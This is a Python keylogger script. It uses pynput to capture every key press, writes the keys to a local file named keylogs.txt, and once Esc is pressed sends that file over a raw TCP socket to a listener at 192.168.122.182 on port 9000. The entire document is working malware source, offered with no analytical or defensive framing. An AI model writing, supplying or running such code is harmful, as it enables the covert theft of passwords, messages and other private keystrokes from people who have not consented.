import pynput.keyboard
import socket

keys = []

def on_press(key):
    global keys
    try:
        print(f"Key pressed: {key.char}")
        keys.append(str(key.char))
    except AttributeError:
        print(f"Special key pressed: {str(key)}")
        keys.append(str(key))

def write_file(keys):
    with open("keylogs.txt", "a") as f:
        for k in keys:
            if k == 'Key.space':
                f.write(' ')
            elif k.find('Key') == -1:
                f.write(k)

def on_release(key):
    global keys
    print(f"Key released: {str(key)}")
    write_file(keys)
    keys = []
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Transmitting data to server...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('192.168.122.182', 9000)
sock.connect(server_address)

with open("keylogs.txt", "rb") as file:
    sock.sendall(file.read())

print("Data transmitted.")
sock.close()